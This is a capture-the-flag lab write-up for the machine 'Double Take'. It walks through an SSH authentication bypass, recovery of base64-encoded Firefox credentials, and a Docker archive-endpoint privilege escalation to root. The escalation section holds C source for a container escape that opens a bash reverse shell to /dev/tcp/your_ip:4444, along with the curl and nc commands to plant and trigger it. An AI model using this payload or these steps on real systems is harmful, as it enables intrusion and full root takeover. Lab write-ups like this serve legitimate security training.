# Double Take (Easy)
#### @austinjump-sec

### Recon
I start with a simple nmap scan and instantly associate the SSH vulnerability with the *SSHole CVE (CVE-2026-123158). 

<img width="923" height="245" alt="Screenshot From 2026-11-20 11-05-28" src="https://github.com/user-attachments/assets/16dfab5c-50ed-48b4-91d2-88e05bb58119" />
### Foothold
Because of this, I scope out which users I can log in  by spamming 'A', I eventually conclude alpine is the foothold for this machine.

<img width="1336" height="526" alt="Screenshot From 2026-11-20 11-26-46" src="https://github.com/user-attachments/assets/c7388c53-1447-4cef-9dc5-9950d2f67e59" />

This works by exploiting BSD conventions. A * means a user who should not be authenticated without a password. However, crypt() returns the string * on failure, meaning with enough bytes being sent over, crypt will return *, which is exactly what we need to login.

### Lateral Movement
Running ls -la on the home directory reveals saved Firefox credentials, which can quickly be decoded as they are encoded with base64. 

<img width="1920" height="166" alt="Screenshot From 2026-11-20 09-54-24" src="https://github.com/user-attachments/assets/5609b2c3-5169-4f42-9620-76a4558825c7" />

<img width="898" height="117" alt="Screenshot From 2026-11-20 09-54-13" src="https://github.com/user-attachments/assets/3f22880f-da1c-4229-afef-2232ccff1c2c" />

User found: Bob

Password found: CorrectHorseBatteryStaple

I use these credentials to sign in with SSH and on the web portals login screen. 

After enough enumeration of the web page I find a file upload, and a docker version hinting towards a Trojan upload, it is susceptible to CVE-2026-41567.

### Privilege Escalation
Notice Docker 29.5.0,
<img width="1336" height="526" alt="Screenshot From 2026-11-20 11-11-16" src="https://github.com/user-attachments/assets/29b4c00f-8c37-4049-9758-3635dd52713d" />

This CVE Is slightly more complicated, it is a binary resolution flaw that essentially works by decompressing packages sent in ``/containers/{id}/archive`` with excessive privileges, this can be used as a privilege escalation vector with a discovered ``/deploy`` endpoint. 

In order to do this, I sent an exploit and a compressed trigger over these endpoints on my attacking machine, in order to give me a shell as the root user. Script provided by @TheCyberGeek:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c",
        "bash -i >& /dev/tcp/your_ip/4444 0>&1", NULL);
    return 1;
}
```

I compile and send over like so:
#### Phase 1 (the exploit plant)
```bash
gcc -static -o xz xz.c
mkdir -p pkg/usr/bin
cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz
cd .. 
curl -u bob:CorrectHorseBatteryStaple \
-F 'archive=@plant.tar' \
-F 'workspace=/' \
http://IP/deploy
```
#### Phase 2 (the compression trigger)

```bash
echo x > t && tar cf - t | xz > trigger.tar.xz

nc -lvnp 4444
#In a different terminal ^

curl -u bob:CorrectHorseBatteryStaple \
-F 'archive=@trigger.tar.xz' \
-F 'workspace=/workspace' \
# Back to previous terminal ^
```
Upon inspection of the nc -lvnp terminal, we have rooted the machine. 


<img width="962" height="243" alt="Screenshot From 2026-11-20 10-57-15" src="https://github.com/user-attachments/assets/ce632bfc-d647-4117-bbca-0b313a4ee240" />

### Skills Learned
- Docker Architecture
- C Programming
- Binary Exploitation
- Credential Recovery / Firefox enumeration

